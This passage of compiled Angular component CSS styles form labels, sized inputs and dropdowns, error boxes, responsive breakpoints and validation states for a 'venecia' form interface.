            width: auto;
            height: auto;
            margin: 0;
            padding: 0 0 3px;
            min-height: 0;
            vertical-align: top;
            line-height: normal
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-input[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-select[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-textarea[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-input[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-select[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-textarea[_ngcontent-c21] {
            display: inline-block;
            width: 215px;
            margin: 0
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-input.xxxsmall[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-select.xxxsmall[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-textarea.xxxsmall[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-input.xxxsmall[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-select.xxxsmall[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-textarea.xxxsmall[_ngcontent-c21] {
            width: 42px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-input.xxsmall[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-select.xxsmall[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-textarea.xxsmall[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-input.xxsmall[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-select.xxsmall[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-textarea.xxsmall[_ngcontent-c21] {
            width: 100px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-input.xsmall[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-select.xsmall[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-textarea.xsmall[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-input.xsmall[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-select.xsmall[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-textarea.xsmall[_ngcontent-c21] {
            width: 128px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-input.small[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-select.small[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-textarea.small[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-input.small[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-select.small[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-textarea.small[_ngcontent-c21] {
            width: 168px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-input.medium[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-select.medium[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-textarea.medium[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-input.medium[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-select.medium[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-textarea.medium[_ngcontent-c21] {
            width: 296px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-input.large[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-select.large[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-textarea.large[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-input.large[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-select.large[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-textarea.large[_ngcontent-c21] {
            width: 350px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-box-error[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-box-error[_ngcontent-c21] {
            width: 215px;
            margin: 4px 0;
            padding: 0;
            line-height: 11px;
            font-size: 12px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-box-error.xxxsmall[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-box-error.xxxsmall[_ngcontent-c21] {
            width: 42px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-box-error.xxsmall[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-box-error.xxsmall[_ngcontent-c21] {
            width: 100px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-box-error.xsmall[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-box-error.xsmall[_ngcontent-c21] {
            width: 128px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-box-error.small[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-box-error.small[_ngcontent-c21] {
            width: 168px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-box-error.medium[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-box-error.medium[_ngcontent-c21] {
            width: 296px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-box-error.large[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-box-error.large[_ngcontent-c21] {
            width: 350px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21]:after {
            top: 10px
        }

        .venecia-main-box.cardLayoutMode[_ngcontent-c21] {
            padding: 0 0 6px !important
        }

        .venecia-main-box.cardLayoutMode[_ngcontent-c21] .venecia-main-form-label[_ngcontent-c21] {
            padding: 0
        }

        .venecia-main-box.cardLayoutMode[_ngcontent-c21] .venecia-main-form-label-data[_ngcontent-c21] {
            max-width: none;
            padding: 3px 0 0
        }

        @media only screen and (max-width:1023px) and (min-width:320px) {
            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c21] {
                width: 100%;
                padding: 0 0 6px !important
            }

            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-label[_ngcontent-c21] {
                display: block;
                width: 100%
            }

            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-label-data[_ngcontent-c21] {
                display: block;
                width: 100%;
                max-width: none;
                padding: 0 0 6px
            }

            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-label-parent[_ngcontent-c21] {
                display: block;
                width: 100%
            }

            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21],
            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] {
                display: block;
                width: 100%;
                padding: 0 0 6px
            }

            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-input[_ngcontent-c21],
            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-select[_ngcontent-c21],
            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-textarea[_ngcontent-c21],
            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-input[_ngcontent-c21],
            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-select[_ngcontent-c21],
            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-textarea[_ngcontent-c21] {
                display: block;
                width: 100%
            }

            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-box-error[_ngcontent-c21],
            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-box-error[_ngcontent-c21] {
                width: 100%;
                padding: 0 4px
            }

            .break-1024.venecia-main-box.cardLayoutMode[_ngcontent-c21] .venecia-main-form-label-data[_ngcontent-c21] {
                padding: 3px 0 0
            }
        }

        @media only screen and (max-width:767px) and (min-width:320px) {
            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c21] {
                width: 100%;
                padding: 0 0 6px !important
            }

            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-label[_ngcontent-c21] {
                display: block;
                width: 100%
            }

            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-label-data[_ngcontent-c21] {
                display: block;
                width: 100%;
                max-width: none;
                padding: 0 0 6px
            }

            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-label-parent[_ngcontent-c21] {
                display: block;
                width: 100%
            }

            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21],
            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] {
                display: block;
                width: 100%;
                padding: 0 0 6px
            }

            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-input[_ngcontent-c21],
            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-select[_ngcontent-c21],
            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-textarea[_ngcontent-c21],
            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-input[_ngcontent-c21],
            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-select[_ngcontent-c21],
            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-textarea[_ngcontent-c21] {
                display: block;
                width: 100%
            }

            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-box-error[_ngcontent-c21],
            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-box-error[_ngcontent-c21] {
                width: 100%;
                padding: 0 4px
            }

            .break-768.venecia-main-box.cardLayoutMode[_ngcontent-c21] .venecia-main-form-label-data[_ngcontent-c21] {
                padding: 3px 0 0
            }
        }

        @media only screen and (max-width:639px) and (min-width:320px) {

            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c21],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c21] {
                width: 100%;
                padding: 0 0 6px !important
            }

            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-label[_ngcontent-c21],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-label[_ngcontent-c21] {
                display: block;
                width: 100%
            }

            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-label-data[_ngcontent-c21],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-label-data[_ngcontent-c21] {
                display: block;
                width: 100%;
                max-width: none;
                padding: 0 0 6px
            }

            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-label-parent[_ngcontent-c21],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-label-parent[_ngcontent-c21] {
                display: block;
                width: 100%
            }

            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21],
            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] {
                display: block;
                width: 100%;
                padding: 0 0 6px
            }

            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-input[_ngcontent-c21],
            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-select[_ngcontent-c21],
            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-textarea[_ngcontent-c21],
            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-input[_ngcontent-c21],
            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-select[_ngcontent-c21],
            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-textarea[_ngcontent-c21],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-input[_ngcontent-c21],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-select[_ngcontent-c21],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-textarea[_ngcontent-c21],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-input[_ngcontent-c21],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-select[_ngcontent-c21],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-textarea[_ngcontent-c21] {
                display: block;
                width: 100%
            }

            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-box-error[_ngcontent-c21],
            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-box-error[_ngcontent-c21],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-box-error[_ngcontent-c21],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-box-error[_ngcontent-c21] {
                width: 100%;
                padding: 0 4px
            }

            .break-0.venecia-main-box.cardLayoutMode[_ngcontent-c21] .venecia-main-form-label-data[_ngcontent-c21],
            .break-640.venecia-main-box.cardLayoutMode[_ngcontent-c21] .venecia-main-form-label-data[_ngcontent-c21] {
                padding: 3px 0 0
            }
        }

        @media only screen and (max-width:479px) and (min-width:320px) {
            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c21] {
                width: 100%;
                padding: 0 0 6px !important
            }

            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-label[_ngcontent-c21] {
                display: block;
                width: 100%
            }

            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-label-data[_ngcontent-c21] {
                display: block;
                width: 100%;
                max-width: none;
                padding: 0 0 6px
            }

            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-label-parent[_ngcontent-c21] {
                display: block;
                width: 100%
            }

            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21],
            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] {
                display: block;
                width: 100%;
                padding: 0 0 6px
            }

            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-input[_ngcontent-c21],
            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-select[_ngcontent-c21],
            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-textarea[_ngcontent-c21],
            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-input[_ngcontent-c21],
            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-select[_ngcontent-c21],
            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-textarea[_ngcontent-c21] {
                display: block;
                width: 100%
            }

            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-box-error[_ngcontent-c21],
            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-box-error[_ngcontent-c21] {
                width: 100%;
                padding: 0 4px
            }

            .break-480.venecia-main-box.cardLayoutMode[_ngcontent-c21] .venecia-main-form-label-data[_ngcontent-c21] {
                padding: 3px 0 0
            }
        }

        .backoffice [_nghost-c21] .dynamicRequest.venecia-main-box[_ngcontent-c21] .venecia-main-form-label[_ngcontent-c21],
        .backoffice [_nghost-c21] .requestDefinitionDisplayMode.venecia-main-box[_ngcontent-c21] .venecia-main-form-label[_ngcontent-c21] {
            width: 200px
        }

        .backoffice [_nghost-c21] .dynamicRequest.venecia-main-box[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-input[_ngcontent-c21],
        .backoffice [_nghost-c21] .dynamicRequest.venecia-main-box[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-select[_ngcontent-c21],
        .backoffice [_nghost-c21] .dynamicRequest.venecia-main-box[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-textarea[_ngcontent-c21],
        .backoffice [_nghost-c21] .dynamicRequest.venecia-main-box[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-input[_ngcontent-c21],
        .backoffice [_nghost-c21] .dynamicRequest.venecia-main-box[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-select[_ngcontent-c21],
        .backoffice [_nghost-c21] .dynamicRequest.venecia-main-box[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-textarea[_ngcontent-c21],
        .backoffice [_nghost-c21] .requestDefinitionDisplayMode.venecia-main-box[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-input[_ngcontent-c21],
        .backoffice [_nghost-c21] .requestDefinitionDisplayMode.venecia-main-box[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-select[_ngcontent-c21],
        .backoffice [_nghost-c21] .requestDefinitionDisplayMode.venecia-main-box[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21] .venecia-main-form-textarea[_ngcontent-c21],
        .backoffice [_nghost-c21] .requestDefinitionDisplayMode.venecia-main-box[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-input[_ngcontent-c21],
        .backoffice [_nghost-c21] .requestDefinitionDisplayMode.venecia-main-box[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-select[_ngcontent-c21],
        .backoffice [_nghost-c21] .requestDefinitionDisplayMode.venecia-main-box[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-textarea[_ngcontent-c21] {
            width: 275px
        }

        .backoffice [_nghost-c21] .dynamicRequest.venecia-main-box[_ngcontent-c21] .venecia-main-form-label-data[_ngcontent-c21],
        .backoffice [_nghost-c21] .requestDefinitionDisplayMode.venecia-main-box[_ngcontent-c21] .venecia-main-form-label-data[_ngcontent-c21] {
            padding: 0 0 6px;
            line-height: 30px;
            width: 60%
        }

        .backoffice [_nghost-c21] .requestDefinitionDisplayMode[_ngcontent-c21] label[_ngcontent-c21] .toggle_title[_ngcontent-c21] {
            font-size: 12px;
            color: #666
        }

        .backoffice [_nghost-c21] .requestDefinitionDisplayMode[_ngcontent-c21] label[_ngcontent-c21] .toggle-control[_ngcontent-c21] {
            margin-top: -21px;
            height: 22px;
            margin-left: 150px;
            background-color: #fff;
            border: 1px solid #c5c5c5;
            width: 3.2em
        }

        .backoffice [_nghost-c21] .requestDefinitionDisplayMode[_ngcontent-c21] label[_ngcontent-c21] .toggle-control[_ngcontent-c21]::after {
            background-color: #c5c5c5;
            margin-top: -1px
        }

        .backoffice [_nghost-c21] .requestDefinitionDisplayMode[_ngcontent-c21] label[_ngcontent-c21] .title[_ngcontent-c21] {
            margin-left: 200px;
            margin-top: -37px
        }

        .backoffice [_nghost-c21] .requestDefinitionDisplayMode[_ngcontent-c21] label[_ngcontent-c21] .noTitle[_ngcontent-c21] {
            margin-left: 200px
        }

        .backoffice [_nghost-c21] .requestDefinitionDisplayMode[_ngcontent-c21] label[_ngcontent-c21] input[_ngcontent-c21]:checked+.toggle-control[_ngcontent-c21] {
            border-color: #c5c5c5;
            background-color: #fff
        }

        .backoffice [_nghost-c21] .requestDefinitionDisplayMode[_ngcontent-c21] label[_ngcontent-c21] input[_ngcontent-c21]:checked+.toggle-control[_ngcontent-c21]:after {
            background-color: #ff4800
        }

        .backoffice [_nghost-c21] .recordGeneratorMode[_ngcontent-c21] .istanbul_form-container_input[_ngcontent-c21] {
            min-width: 40px !important;
            padding: 4px 8px 3px 4px !important
        }

        .venecia-main-form-drop[_ngcontent-c21] select[_ngcontent-c21] {
            background: 0 0;
            padding: 0 28px 0 5px;
            font-size: 14px;
            width: 215px;
            border: 1px solid #bbb;
            border-radius: 0;
            height: 30px;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap
        }

        .venecia-main-form-drop[_ngcontent-c21] select[_ngcontent-c21]::-ms-expand {
            display: none
        }

        .venecia-main-form-select[_ngcontent-c21]:focus {
            border: 1px solid #999;
            outline: 0;
            background: #f2f6f6;
            -webkit-box-shadow: 0 0 4px 1px rgba(0, 0, 0, .1);
            box-shadow: 0 0 4px 1px rgba(0, 0, 0, .1)
        }

        .venecia-main-form-drop[_ngcontent-c21] {
            position: relative;
            height: 30px;
            margin-bottom: 7px;
            background: #fff;
            display: inline-block;
            max-width: 100%
        }

        .venecia-main-form-drop[_ngcontent-c21]:after {
            position: absolute;
            top: 7px;
            right: 10px;
            font-family: streamline;
            color: #0097c1;
            font-size: 11px;
            content: "\e90d";
            pointer-events: none
        }

        .venecia-main-form-drop.disabled[_ngcontent-c21]:after {
            opacity: .4
        }

        .venecia-main-form-drop.disabled[_ngcontent-c21] .venecia-main-form-select[_ngcontent-c21] {
            border: 1px solid rgba(187, 187, 187, .4)
        }

        .venecia-main-form-drop.required[_ngcontent-c21] .venecia-main-form-select[_ngcontent-c21] {
            border-left: 3px solid #0097c1
        }

        .venecia-main-form-drop.valid.disabled[_ngcontent-c21] .venecia-main-form-select[_ngcontent-c21] {
            border-left: 3px solid rgba(0, 167, 86, .4) !important
        }

        .venecia-main-form-drop.valid[_ngcontent-c21] .venecia-main-form-select[_ngcontent-c21] {
            border-left: 3px solid #00a756
        }

        .venecia-main-form-drop.focusin[_ngcontent-c21] {
            border: 1px solid #12447f !important
        }

        .venecia-main-form-drop.required.focusin[_ngcontent-c21] {
            border: 1px solid #12447f !important;
            border-left: 3px solid #12447f !important
        }

        .venecia-main-form-drop.xxxsmall[_ngcontent-c21] {
            width: 88px
        }

        .venecia-main-form-drop.xxxsmall[_ngcontent-c21] select[_ngcontent-c21] {
            width: 88px;
            padding-right: 24px
        }

        .venecia-main-form-drop.xsmall[_ngcontent-c21] {
            width: 128px
        }

        .venecia-main-form-drop.xsmall[_ngcontent-c21] select[_ngcontent-c21] {
            width: 128px;
            padding-right: 24px
        }

        .venecia-main-form-drop.small[_ngcontent-c21] {
            width: 168px
        }

        .venecia-main-form-drop.small[_ngcontent-c21] select[_ngcontent-c21] {
            width: 168px;
            padding-right: 24px
        }

        .venecia-main-form-drop.medium[_ngcontent-c21] {
            width: 296px
        }

        .venecia-main-form-drop.medium[_ngcontent-c21] select[_ngcontent-c21] {
            width: 296px;
            padding-right: 24px
        }

        .venecia-main-form-drop.large[_ngcontent-c21] {
            width: 350px
        }

        .venecia-main-form-drop.large[_ngcontent-c21] select[_ngcontent-c21] {
            width: 350px;
            padding-right: 24px
        }

        icb-catalog-selector[_ngcontent-c21] {
            display: inline-block
        }

        .venecia-cursor_pointer[_ngcontent-c21] {
            cursor: pointer;
            color: #333
        }

        .venecia-main-form.invalid[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] {
            border: 1px solid #b20000;
            -webkit-animation: .3s venecia-validation-drop-animated;
            animation: .3s venecia-validation-drop-animated
        }

        .venecia-main-form[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] {
            border: 1px solid #bbb;
            -webkit-animation: .3s venecia-validation-drop-reverse;
            animation: .3s venecia-validation-drop-reverse
        }

        .venecia-main-form.invalid[_ngcontent-c21] .venecia-main-form-drop.required[_ngcontent-c21] {
            border: 1px solid #b20000;
            border-left: 3px solid #b20000;
            -webkit-animation: .3s venecia-validation-drop-required-animated;
            animation: .3s venecia-validation-drop-required-animated
        }

        .venecia-main-form[_ngcontent-c21] .venecia-main-form-drop.required[_ngcontent-c21] {
            border: 1px solid #bbb;
            border-left: 3px solid #0097c1;
            -webkit-animation: .3s venecia-validation-drop-required-reverse;
            animation: .3s venecia-validation-drop-required-reverse
        }

        .venecia_arrow-down[_ngcontent-c21] {
            display: inline-block;
            height: 25px;
            width: 16px;
            line-height: 30px;
            text-align: center;
            font-size: 12px;
            color: #0097c1;
            vertical-align: top;
            cursor: pointer
        }

        .venecia_arrow-down[_ngcontent-c21] i[_ngcontent-c21] {
            vertical-align: middle
        }

        .montevideo[_ngcontent-c21] {
            cursor: pointer;
            font-size: 14px;
            margin: 3px 5px;
            padding: 2px 10px;
